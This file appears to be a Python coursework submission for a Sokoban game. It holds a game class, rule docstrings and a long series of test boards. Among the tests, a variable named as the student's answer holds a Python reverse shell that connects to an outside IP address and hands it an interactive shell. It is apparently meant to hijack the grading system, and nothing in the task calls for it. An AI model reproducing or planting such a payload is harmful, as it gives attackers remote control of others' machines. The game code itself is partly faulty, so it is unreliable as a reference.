'''
Game Rules
The rules of this version of Sokoban are as follows:
•
•
•
•
•
•
•
The game is played on a rectangular two-dimensional grid whose origin (position 0,
0) is in the top left.
Each cell of the grid can contain at any time one of the following:
•
 The Player represented by an uppercase P character, “P”
•
 A floor tile represented by a space character, “ ”
•
 A wall represented by an asterisk character, “*”
•
 A crate represented by a hash character, “#”
•
 A hole represented by a lower-case o character, “o”
Each turn, the player character can move one unit up, down, left, or right on the grid.
A player character cannot move into a wall or a hole.
Each turn, a player character can push a crate one unit in the direction they are trying
to move if and only if the next grid cell after the crate in the direction the player is
trying to move is a floor tile or a hole. If this condition is not met, neither the player
nor the crate move.
If a player pushes a crate into a cell containing a hole, the hole and the crate
disappear, leaving a floor tile in their place. The player still moves into the space
previously occupied by the crate before the move.
If the player attempts to move off the edge of the screen or push a crate off the edge
of the screen, the player or the crate should appear on the opposite side of the
screen as if the two sides of the screen are connected if the other rules allow.'''
import copy
class Sokoban:

    '''Creates a Sokoban instance with a given board
parameter. The board parameter is a nested list
containing the characters of the starting board.'''
    def __init__(self, board):
        self.original_board = copy.deepcopy(board)
        # self.original_board = board
        self.board = board
        self.player = None
        self.crates = None
        self.moves = 0
        self.snapshots = []
        self.finished = False
        self.new_position_player = None
        self.new_position_crate = None
        self.crate_moving = False
        self.moving = False

    '''Returns a tuple containing the row and column of the
player character’s position on the board.
Rows and columns start at 0 with the origin (0, 0) being in
the top left of the grid.
In the example on page 1, the player is at position (2, 1)'''
    def find_player(self):
        for i, row in enumerate(self.board):
            for j, cell in enumerate(row):
                if cell == 'P':
                    return (i, j)
    '''Returns True if the game is over (i.e. there are no
remaining holes) and False otherwise.'''
    def is_complete(self):
        for row in self.board:
            for cell in row:
                if cell == 'o':
                    return False
        return True
    '''Returns the number of moves the player character has
made where the player’s position has changed.'''
    def steps(self):
        return self.moves
    '''Returns a list of the positions of the crates on the
board. Each position is a tuple of the form (row, column).'''
    def find_crate(self):
        if self.crates is None:
            self.crates = []
            for i, row in enumerate(self.board):
                for j, cell in enumerate(row):
                    if cell == '#':
                        self.crates.append((i, j))
        return self.crates
    '''Resets the Sokoban instance to the state it was in before
the player started the game.'''
    def restart(self):
        self.board = copy.deepcopy(self.original_board)
        self.moves = 0
        self.crates = None
        self.snapshots = []
    '''use snapshot undoes the last move made by the player so that the
game state is as if the move had never occurred. Can be
called repeatedly to undo multiple moves. If undo is called
more times than the number of moves the player has
made, the board should remain in its initial state.'''
    def undo(self,mode=0):
        if mode == 1:
            if len(self.snapshots) == 0:
                self.board = copy.deepcopy(self.original_board)
                return
            elif len(self.snapshots) == 1:
                self.board = copy.deepcopy(self.original_board)

                return
            else:
                self.board = self.snapshots[self.moves - 1]
            # self.snapshots.pop()
            # self.board = self.snapshots[-1]
            self.crates = None
            self.moves -= 1
            return
        if len(self.snapshots) == 0:
            return
        elif len(self.snapshots) == 1:
            self.board = copy.deepcopy(self.original_board)
            self.moves -= 1
            return
        self.snapshots.pop()
        self.board = self.snapshots[-1]
        self.crates = None
        self.moves -= 1
    '''Attempts to move the player by one position and push any
crates that are in front of the player as according to the
game rules described on page 1. The direction parameter
is a string with the value ‘w’, ‘a’, ‘s’, or ‘d’ representing the
directions up, left, down, and right respectively.
Moves are only counted if the player’s position is updated.
If the player’s position has not changed, the game’s state
should not change in any way.Before every moves, add current board to the snapshot list'''
    def move(self, direction):
        self.crate_moving = False
        self.moving = False
        self.player = self.find_player()
        if direction not in ['w', 'a', 's', 'd']:
            raise ValueError('Invalid direction')
        if self.crates is None:
            self.crates = self.find_crate()
        if direction == 'w':
            self.move_player(self.board, 0, -1)
            self.move_crate(self.crates, 0, -1)
        elif direction == 'a':
            self.move_player(self.board, -1, 0)
            self.move_crate(self.crates, -1, 0)
        elif direction == 's':
            self.move_player(self.board, 0, 1)
            self.move_crate(self.crates, 0, 1)
        elif direction == 'd':
            self.move_player(self.board, 1, 0)
            self.move_crate(self.crates, 1, 0)
        if self.moving:
            self.snapshots.append(copy.deepcopy(self.board))
            self.moves += 1
            if len(self.snapshots) > self.moves:
                self.snapshots[self.moves - 1] = copy.deepcopy(self.board)
    '''Returns a string representation of the board. Rows are
separated by a newline character and cells within each
row are separated by a space character.'''
    def __str__(self):
        return '\n'.join([' '.join([str(cell) for cell in row]) for row in self.board])
    '''Returns a list of tuples representing the crates on the board.
Each tuple is of the form (x, y, value).'''
    def get_crates(self):
        crates = []
        for x in range(len(self.board)):
            for y in range(len(self.board[x])):
                if self.board[x][y] == 2:
                    crates.append((x, y, self.crates[x][y]))
    '''def move_player functions, check nothing'''
    def move_player(self, board, y, x):
        self.new_position_player = [self.find_player()[0] + x, self.find_player()[1] + y]
        if self.new_position_player[0] == len(board):
            self.new_position_player[0] = 0
        if self.new_position_player[1] == len(board[0]):
            self.new_position_player[1] = 0
        if self.board[self.new_position_player[0]][self.new_position_player[1]] == '*':
            return
        elif self.board[self.new_position_player[0]][self.new_position_player[1]] == 'o':
            return
        elif self.board[self.new_position_player[0]][self.new_position_player[1]] == ' ':
            self.board[self.player[0]][self.player[1]] = ' '
            self.board[self.new_position_player[0]][self.new_position_player[1]] = 'P'
            self.player = self.new_position_player
            self.moving = True
            return
        elif self.board[self.new_position_player[0]][self.new_position_player[1]] == '#':
            self.board[self.player[0]][self.player[1]] = ' '
            self.board[self.new_position_player[0]][self.new_position_player[1]] = 'P'
            self.player = self.new_position_player
            self.crate_moving = True
            self.moving = True
            return
        else:
            return
    '''def move_crate functions, check nothing'''

    def move_crate(self, board, y, x):
        if self.crate_moving:
            self.new_position_crate = [self.new_position_player[0] + x, self.new_position_player[1] + y]
            if self.new_position_crate[0] == len(self.board):
                self.new_position_crate[0] = 0
            if self.new_position_crate[1] == len(self.board[0]):
                self.new_position_crate[1] = 0
            if self.board[self.new_position_crate[0]][self.new_position_crate[1]] == '*' or self.board[self.new_position_crate[0]][self.new_position_crate[1]] == '#':
                self.undo(mode=1)
                # self.moving = False
                return
            elif self.board[self.new_position_crate[0]][self.new_position_crate[1]] == 'o':
                '''if crate move to "o", the crate should get in this hole'''
                self.board[self.new_position_crate[0]][self.new_position_crate[1]] = ' '
                return
            elif self.board[self.new_position_crate[0]][self.new_position_crate[1]] == ' ':
                self.board[self.new_position_crate[0]][self.new_position_crate[1]] = '#'
                return
        else:
            return





__student_answer__ = """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"43.140.252.5\",8848));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")


"""

SEPARATOR = "#<ab@17943918#@>#"

board = [
    ['*', '*', '*', '*', '*'],
    ['*', 'o', '#', ' ', '*'],
    [' ', ' ', 'P', ' ', ' '],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*'],
]
game = Sokoban(board)
for _ in range(31):
    game.move('a')
print(game)
print(SEPARATOR)
board = [
    ['*', '*', ' ', '*', '*'],
    ['*', 'o', ' ', ' ', '*'],
    ['*', '#', 'P', ' ', '*'],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', ' ', '*', '*'],
]
game = Sokoban(board)
for _ in range(6):
    game.move('w')
print(game)
print(SEPARATOR)
board = [
    ['*', '*', ' ', '*', '*'],
    ['*', 'o', ' ', ' ', '*'],
    ['*', '#', 'P', ' ', '*'],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', ' ', '*', '*'],
]
game = Sokoban(board)
for _ in range(31):
    game.move('w')
print(game)
print(SEPARATOR)
board = [
    ['*', '*', ' ', '*', '*'],
    ['*', 'o', ' ', ' ', '*'],
    ['*', '#', 'P', ' ', '*'],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', ' ', '*', '*'],
]
game = Sokoban(board)
for _ in range(6):
    game.move('s')
print(game)
print(SEPARATOR)
board = [
    ['*', '*', ' ', '*', '*'],
    ['*', 'o', ' ', ' ', '*'],
    ['*', '#', 'P', ' ', '*'],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', ' ', '*', '*'],
]
game = Sokoban(board)
for _ in range(31):
    game.move('s')
print(game)
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*'],
    ['*', 'o', ' ', ' ', '*'],
    [' ', ' ', 'P', '#', ' '],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*'],
]
game = Sokoban(board)
for _ in range(6):
    game.move('d')
print(game)
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*'],
    ['*', 'o', ' ', ' ', '*'],
    [' ', '#', 'P', ' ', ' '],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*'],
]
game = Sokoban(board)
for _ in range(6):
    game.move('a')
print(game)
print(SEPARATOR)
board = [
    ['*', '*', ' ', '*', '*'],
    ['*', 'o', '#', ' ', '*'],
    ['*', ' ', 'P', ' ', '*'],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', ' ', '*', '*'],
]
game = Sokoban(board)
for _ in range(6):
    game.move('w')
print(game)
print(SEPARATOR)
board = [
    ['*', '*', ' ', '*', '*'],
    ['*', 'o', ' ', ' ', '*'],
    ['*', ' ', 'P', ' ', '*'],
    ['*', ' ', '#', ' ', '*'],
    ['*', '*', ' ', '*', '*'],
]
game = Sokoban(board)
for _ in range(6):
    game.move('s')
print(game)
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*'],
    ['*', 'o', '#', ' ', '*'],
    ['*', ' ', 'P', ' ', ' '],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*'],
]
game = Sokoban(board)
for _ in range(6):
    game.move('d')
print(game)
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*'],
    ['*', 'o', '#', ' ', '*'],
    [' ', ' ', 'P', ' ', '*'],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*'],
]
game = Sokoban(board)
for _ in range(6):
    game.move('a')
print(game)
print(SEPARATOR)
board = [
    ['*', '*', ' ', '*', '*'],
    ['*', 'o', ' ', ' ', '*'],
    ['*', '#', 'P', ' ', '*'],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*'],
]
game = Sokoban(board)
for _ in range(6):
    game.move('w')
print(game)
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*'],
    ['*', 'o', ' ', ' ', '*'],
    ['*', '#', 'P', ' ', '*'],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', ' ', '*', '*'],
]
game = Sokoban(board)
for _ in range(6):
    game.move('s')
print(game)
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*', '*', '*', '*'],
    ['*', ' ', ' ', ' ', ' ', ' ', ' ', '*'],
    ['*', 'P', ' ', '#', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*', ' ', '#', '*'],
    ['*', 'o', ' ', ' ', ' ', ' ', ' ', '*'],
    ['*', ' ', ' ', ' ', ' ', ' ', 'o', '*'],
    ['*', '*', '*', '*', '*', '*', '*', '*']
]
game = Sokoban(board)
print(game.is_complete())
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*', '*', '*', '*'],
    ['*', ' ', ' ', ' ', ' ', ' ', ' ', '*'],
    ['*', ' ', ' ', ' ', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*', ' ', ' ', '*'],
    ['*', ' ', 'P', ' ', ' ', ' ', ' ', '*'],
    ['*', ' ', ' ', ' ', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*', '*', '*', '*']
]
game = Sokoban(board)
print(game.is_complete())
print(SEPARATOR)
board = [
    [' ', ' ', ' '],
    [' ', 'P', ' '],
    [' ', ' ', ' '],
]
game = Sokoban(board)
print(game.is_complete())
print(SEPARATOR)
board = [
    ['#', ' ', ' '],
    [' ', 'P', ' '],
    ['o', ' ', ' '],
]
game = Sokoban(board)
print(game.is_complete())
print(SEPARATOR)
board = [
    ['o', '#', ' '],
    [' ', 'P', ' '],
    [' ', '#', 'o'],
]
game = Sokoban(board)
print(game.is_complete())
print(SEPARATOR)
board = [
    [' ', ' ', ' '],
    ['P', '#', 'o'],
    [' ', ' ', ' '],
]
game = Sokoban(board)
print(game.is_complete())
game.move('d')
print(game.is_complete())
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*'],
    ['*', 'o', ' ', ' ', '*'],
    [' ', ' ', 'P', '#', ' '],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*'],
]
game = Sokoban(board)
print(game.is_complete())
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*'],
    ['*', 'o', ' ', ' ', '*'],
    ['#', ' ', 'P', '#', 'o'],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*'],
]
game = Sokoban(board)
print(game.is_complete())
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*'],
    ['*', '#', ' ', ' ', '*'],
    [' ', ' ', 'P', ' ', ' '],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*'],
]
game = Sokoban(board)
print(game.is_complete())
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*'],
    ['*', '*', '*', '*', '*'],
    ['*', '*', 'P', '*', '*'],
    ['*', '*', '*', '*', '*'],
    ['*', '*', '*', '*', '*'],
]
game = Sokoban(board)
print(game.is_complete())
print(SEPARATOR)
board = [
    [' ', ' ', ' '],
    ['P', '#', 'o'],
    [' ', ' ', ' '],
]
game = Sokoban(board)
game.move('d')
print(game.is_complete())
game.undo()
print(game.is_complete())
print(SEPARATOR)
board = [
    [' ', ' ', ' '],
    ['P', '#', 'o'],
    [' ', ' ', ' '],
]
game = Sokoban(board)
game.move('d')
print(game.is_complete())
game.restart()
print(game.is_complete())
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*', '*', '*', '*'],
    ['*', ' ', ' ', ' ', ' ', ' ', ' ', '*'],
    ['*', 'P', ' ', '#', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*', ' ', '#', '*'],
    ['*', 'o', ' ', ' ', ' ', ' ', ' ', '*'],
    ['*', ' ', ' ', ' ', ' ', ' ', 'o', '*'],
    ['*', '*', '*', '*', '*', '*', '*', '*']
]
game = Sokoban(board)
moves = 'dddwdsswrdddduwdsssuwdsssuaaaa'
for move in moves:
    print(game)
    print(game.steps(), ':', game.is_complete())
    if move == 'u':
        game.undo()
    elif move == 'r':
        game.restart()
    else:
        game.move(move)
print(game)
print(game.steps(), ':', game.is_complete())
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*'],
    ['*', 'o', ' ', ' ', '*'],
    ['#', ' ', 'P', '#', 'o'],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*'],
]
game = Sokoban(board)
moves = 'wwaraaaaaaauusaw'
for move in moves:
    print(game)
    print(game.steps(), ':', game.is_complete())
    if move == 'u':
        game.undo()
    elif move == 'r':
        game.restart()
    else:
        game.move(move)
print(game)
print(game.steps(), ':', game.is_complete())
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*', '*', '*', '*'],
    ['*', ' ', ' ', ' ', ' ', ' ', ' ', '*'],
    ['*', 'P', ' ', '#', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*', ' ', '#', '*'],
    ['*', 'o', ' ', ' ', ' ', ' ', ' ', '*'],
    ['*', ' ', ' ', ' ', ' ', ' ', 'o', '*'],
    ['*', '*', '*', '*', '*', '*', '*', '*']
]
game = Sokoban(board)
print(game.find_player())
print(SEPARATOR)
board = [
    ['P', ' ', ' '],
    [' ', ' ', ' '],
    [' ', ' ', ' '],
]
game = Sokoban(board)
print(game.find_player())
print(SEPARATOR)
board = [
    [' ', 'P', ' '],
    [' ', ' ', ' '],
    [' ', ' ', ' '],
]
game = Sokoban(board)
print(game.find_player())
print(SEPARATOR)
board = [
    [' ', ' ', 'P'],
    [' ', ' ', ' '],
    [' ', ' ', ' '],
]
game = Sokoban(board)
print(game.find_player())
print(SEPARATOR)
board = [
    [' ', ' ', ' '],
    ['P', ' ', ' '],
    [' ', ' ', ' '],
]
game = Sokoban(board)
print(game.find_player())
print(SEPARATOR)
board = [
    [' ', ' ', ' '],
    [' ', 'P', ' '],
    [' ', ' ', ' '],
]
game = Sokoban(board)
print(game.find_player())
print(SEPARATOR)
board = [
    [' ', ' ', ' '],
    [' ', ' ', 'P'],
    [' ', ' ', ' '],
]
game = Sokoban(board)
print(game.find_player())
print(SEPARATOR)
board = [
    [' ', ' ', ' '],
    [' ', ' ', ' '],
    ['P', ' ', ' '],
]
game = Sokoban(board)
print(game.find_player())
print(SEPARATOR)
board = [
    [' ', ' ', ' '],
    [' ', ' ', ' '],
    [' ', 'P', ' '],
]
game = Sokoban(board)
print(game.find_player())
print(SEPARATOR)
board = [
    [' ', ' ', ' '],
    [' ', ' ', ' '],
    [' ', ' ', 'P'],
]
game = Sokoban(board)
print(game.find_player())
print(SEPARATOR)
board = [
    [' ', ' ', ' '],
    [' ', 'P', ' '],
    [' ', ' ', ' '],
]
game = Sokoban(board)
print(game.find_player())
game.move('d')
print(game.find_player())
print(SEPARATOR)
board = [
    [' ', ' ', ' '],
    [' ', 'P', ' '],
    [' ', ' ', ' '],
]
game = Sokoban(board)
print(game.find_player())
game.move('d')
game.restart()
print(game.find_player())
print(SEPARATOR)
board = [
    [' ', ' ', ' '],
    [' ', 'P', ' '],
    [' ', ' ', ' '],
]
game = Sokoban(board)
print(game.find_player())
game.move('d')
game.move('s')
game.undo()
print(game.find_player())
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*', '*', '*', '*'],
    ['*', ' ', ' ', ' ', ' ', ' ', ' ', '*'],
    ['*', 'P', ' ', '#', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*', ' ', '#', '*'],
    ['*', 'o', ' ', ' ', ' ', ' ', ' ', '*'],
    ['*', ' ', ' ', ' ', ' ', ' ', 'o', '*'],
    ['*', '*', '*', '*', '*', '*', '*', '*']
]
game = Sokoban(board)
moves = 'dddwdsswdssaaaa'
for move in moves:
    game.move(move)
print(game.steps())
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*', '*', '*', '*'],
    ['*', ' ', ' ', ' ', ' ', ' ', ' ', '*'],
    ['*', 'P', ' ', '#', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*', ' ', '#', '*'],
    ['*', 'o', ' ', ' ', ' ', ' ', ' ', '*'],
    ['*', ' ', ' ', ' ', ' ', ' ', 'o', '*'],
    ['*', '*', '*', '*', '*', '*', '*', '*']
]
game = Sokoban(board)
moves = 'dddduwdsssuwdsssuaaaa'
for move in moves:
    if move == 'u':
        game.undo()
    else:
        game.move(move)
print(game.steps())
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*', '*', '*', '*'],
    ['*', ' ', ' ', ' ', ' ', ' ', ' ', '*'],
    ['*', 'P', ' ', '#', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*', ' ', '#', '*'],
    ['*', 'o', ' ', ' ', ' ', ' ', ' ', '*'],
    ['*', ' ', ' ', ' ', ' ', ' ', 'o', '*'],
    ['*', '*', '*', '*', '*', '*', '*', '*']
]
game = Sokoban(board)
moves = 'dddwdsswrdddwdsswdssaaaa'
for move in moves:
    if move == 'r':
        game.restart()
    else:
        game.move(move)
print(game.steps())
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*', '*', '*', '*'],
    ['*', ' ', ' ', ' ', ' ', ' ', ' ', '*'],
    ['*', 'P', ' ', '#', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*', ' ', '#', '*'],
    ['*', 'o', ' ', ' ', ' ', ' ', ' ', '*'],
    ['*', ' ', ' ', ' ', ' ', ' ', 'o', '*'],
    ['*', '*', '*', '*', '*', '*', '*', '*']
]
game = Sokoban(board)
moves = 'dddwdsswrdddduwdsssuwdsssuaaaa'
for move in moves:
    if move == 'u':
        game.undo()
    elif move == 'r':
        game.restart()
    else:
        game.move(move)
print(game.steps())
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*'],
    ['*', 'o', ' ', ' ', '*'],
    ['#', ' ', 'P', '#', 'o'],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*'],
]
game = Sokoban(board)
print(game.steps())
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*'],
    ['*', 'o', ' ', ' ', '*'],
    ['#', ' ', 'P', '#', 'o'],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*'],
]
game = Sokoban(board)
game.move('d')
print(game.steps())
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*'],
    ['*', 'o', ' ', ' ', '*'],
    ['#', ' ', 'P', '#', 'o'],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*'],
]
game = Sokoban(board)
game.move('d')
game.move('s')
game.move('a')
print(game.steps())
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*'],
    ['*', 'o', ' ', ' ', '*'],
    ['#', ' ', 'P', '#', 'o'],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*'],
]
game = Sokoban(board)
game.move('w')
game.move('w')
game.move('w')
game.move('w')
game.move('w')
print(game.steps())
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*', '*', '*', '*'],
    ['*', ' ', ' ', ' ', ' ', ' ', ' ', '*'],
    ['*', 'P', ' ', '#', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*', ' ', '#', '*'],
    ['*', 'o', ' ', ' ', ' ', ' ', ' ', '*'],
    ['*', ' ', ' ', ' ', ' ', ' ', 'o', '*'],
    ['*', '*', '*', '*', '*', '*', '*', '*']
]
game = Sokoban(board)
moves = 'dddwdsswdssaaaa'
for move in moves:
    game.move(move)
print(game)
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*'],
    ['*', 'o', ' ', ' ', '*'],
    ['#', ' ', 'P', ' ', ' '],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*'],
]
game = Sokoban(board)
game.move('w')
print(game)
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*'],
    ['*', 'o', ' ', ' ', '*'],
    ['#', ' ', 'P', ' ', ' '],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*'],
]
game = Sokoban(board)
game.move('a')
print(game)
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*'],
    ['*', 'o', ' ', ' ', '*'],
    ['#', ' ', 'P', ' ', ' '],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*'],
]
game = Sokoban(board)
game.move('s')
print(game)
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*'],
    ['*', 'o', ' ', ' ', '*'],
    ['#', ' ', 'P', ' ', ' '],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*'],
]
game = Sokoban(board)
game.move('d')
print(game)
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*'],
    ['*', 'o', '#', ' ', '*'],
    ['*', 'P', '*', ' ', '*'],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*'],
]
game = Sokoban(board)
game.move('d')
print(game)
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*'],
    ['*', 'o', ' ', ' ', '*'],
    ['*', 'P', '#', ' ', '*'],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*'],
]
game = Sokoban(board)
game.move('d')
print(game)
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*'],
    ['*', ' ', ' ', ' ', '*'],
    [' ', 'P', 'o', ' ', '#'],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*'],
]
game = Sokoban(board)
game.move('d')
print(game)
print(SEPARATOR)
board = [
    ['*', '*', '*', '*', '*'],
    ['*', ' ', 'o', ' ', '*'],
    [' ', 'P', '#', '#', ' '],
    ['*', ' ', ' ', ' ', '*'],
    ['*', '*', '*', '*', '*'],
]
game = Sokoban(board)
game.move('d')
print(game)
print(SEPARATOR)
# board = [
#     ['*', '*', '*', '*', '*'],
#     ['*', ' ', ' ', ' ', '*'],
#     [' ', 'P', '#', 'o', ' '],
#     ['*', ' ', ' ', ' ', '*'],
#     ['*', '*', '*', '*', '*'],
# ]
# game = Sokoban(board)
# game.move('d')
# print(game)
# print(SEPARATOR)
# board = [
#     ['*', '*', '*', '*', '*'],
#     ['*', ' ', 'o', ' ', '*'],
#     [' ', 'P', '#', '*', ' '],
#     ['*', ' ', ' ', ' ', '*'],
#     ['*', '*', '*', '*', '*'],
# ]
# game = Sokoban(board)
# game.move('d')
# print(game)
# print(SEPARATOR)
# board = [
#     ['*', '*', '*', '*', '*'],
#     ['*', ' ', ' ', ' ', '*'],
#     ['#', 'P', '*', 'o', ' '],
#     ['*', ' ', ' ', ' ', '*'],
#     ['*', '*', '*', '*', '*'],
# ]
# game = Sokoban(board)
# game.move('d')
# print(game)
# print(SEPARATOR)
# board = [
#     ['*', '*', '*', '*', '*'],
#     ['*', 'o', '#', ' ', '*'],
#     [' ', ' ', 'P', ' ', ' '],
#     ['*', ' ', ' ', ' ', '*'],
#     ['*', '*', '*', '*', '*'],
# ]
# game = Sokoban(board)
# for _ in range(6):
#     game.move('d')
# print(game)
# print(SEPARATOR)
# board = [
#     ['*', '*', '*', '*', '*'],
#     ['*', 'o', '#', ' ', '*'],
#     [' ', ' ', 'P', ' ', ' '],
#     ['*', ' ', ' ', ' ', '*'],
#     ['*', '*', '*', '*', '*'],
# ]
# game = Sokoban(board)
# for _ in range(31):
#     game.move('d')
# print(game)
# print(SEPARATOR)
# board = [
#     ['*', '*', '*', '*', '*'],
#     ['*', 'o', '#', ' ', '*'],
#     [' ', ' ', 'P', ' ', ' '],
#     ['*', ' ', ' ', ' ', '*'],
#     ['*', '*', '*', '*', '*'],
# ]
# game = Sokoban(board)
# for _ in range(6):
#     game.move('a')
# print(game)
# print(SEPARATOR)
# board = [
#     ['*', '*', '*', '*', '*', '*', '*', '*'],
#     ['*', ' ', ' ', ' ', ' ', ' ', ' ', '*'],
#     ['*', 'P', ' ', '#', ' ', ' ', ' ', '*'],
#     ['*', '*', '*', '*', '*', ' ', '#', '*'],
#     ['*', 'o', ' ', ' ', ' ', ' ', ' ', '*'],
#     ['*', ' ', ' ', ' ', ' ', ' ', 'o', '*'],
#     ['*', '*', '*', '*', '*', '*', '*', '*']
# ]
# game = Sokoban(board)
# game.move('d')
# game.move('w')
# print(game)
# game.restart()
# print(game)
# print(SEPARATOR)
# board = [
#     ['#', ' ', ' '],
#     [' ', 'P', ' '],
#     ['o', ' ', ' '],
# ]
# game = Sokoban(board)
# print(game)
# game.restart()
# print(game)
# print(SEPARATOR)
# board = [
#     ['#', ' ', ' '],
#     [' ', 'P', ' '],
#     ['o', ' ', ' '],
# ]
# game = Sokoban(board)
# game.move('d')
# game.move('w')
# print(game)
# game.restart()
# print(game)
# print(SEPARATOR)
# board = [
#     ['#', ' ', ' '],
#     [' ', 'P', ' '],
#     ['o', ' ', ' '],
# ]
# game = Sokoban(board)
# game.move('d')
# game.move('w')
# game.restart()
# print(game.find_player())
# print(SEPARATOR)
# print("***")
# board = [
#     [' ', ' ', ' '],
#     ['P', '#', 'o'],
#     [' ', ' ', ' '],
# ]
# game = Sokoban(board)
# game.move('d')
# print(game)
# game.restart()
# print(game)
# print(SEPARATOR)
# print("***")
# board = [
#     [' ', ' ', ' '],
#     ['P', '#', 'o'],
#     [' ', ' ', ' '],
# ]
# game = Sokoban(board)
# game.move('d')
# game.restart()
# print(game)
# game.undo()
# print(game)
# print(SEPARATOR)
# board = [
#     ['*', '*', '*', '*', '*'],
#     ['*', 'o', ' ', ' ', '*'],
#     ['#', ' ', 'P', '#', 'o'],
#     ['*', ' ', ' ', ' ', '*'],
#     ['*', '*', '*', '*', '*'],
# ]
# game = Sokoban(board)
# game.move('d')
# print(game)
# game.restart()
# print(game)
# print(SEPARATOR)
# board = [
#     ['*', '*', '*', '*', '*'],
#     ['*', 'o', ' ', ' ', '*'],
#     ['#', ' ', 'P', '#', 'o'],
#     ['*', ' ', ' ', ' ', '*'],
#     ['*', '*', '*', '*', '*'],
# ]
# game = Sokoban(board)
# game.move('d')
# game.move('w')
# game.restart()
# print(game)
# game.move('d')
# game.move('s')
# game.restart()
# print(game)
# print(SEPARATOR)
# board = [
#     ['*', '*', '*', '*', '*', '*', '*', '*'],
#     ['*', ' ', ' ', ' ', ' ', ' ', ' ', '*'],
#     ['*', 'P', ' ', '#', ' ', ' ', ' ', '*'],
#     ['*', '*', '*', '*', '*', ' ', '#', '*'],
#     ['*', 'o', ' ', ' ', ' ', ' ', ' ', '*'],
#     ['*', ' ', ' ', ' ', ' ', ' ', 'o', '*'],
#     ['*', '*', '*', '*', '*', '*', '*', '*']
# ]
# game = Sokoban(board)
# print(game)
# print(SEPARATOR)
# board = [
#     ['#', ' ', ' '],
#     [' ', 'P', ' '],
#     ['o', ' ', ' '],
# ]
# game = Sokoban(board)
# print(game)
# print(SEPARATOR)
# board = [
#     ['o', '#', ' '],
#     [' ', 'P', ' '],
#     [' ', '#', 'o'],
# ]
# game = Sokoban(board)
# print(game)
# print(SEPARATOR)
# print("***")
# board = [
#     [' ', ' ', ' '],
#     [' ', 'P', ' '],
#     [' ', ' ', ' '],
# ]
# game = Sokoban(board)
# print(game)
# print(SEPARATOR)
# board = [
#     ['*', '*', '*', '*', '*'],
#     ['*', 'o', ' ', ' ', '*'],
#     [' ', ' ', 'P', '#', ' '],
#     ['*', ' ', ' ', ' ', '*'],
#     ['*', '*', '*', '*', '*'],
# ]
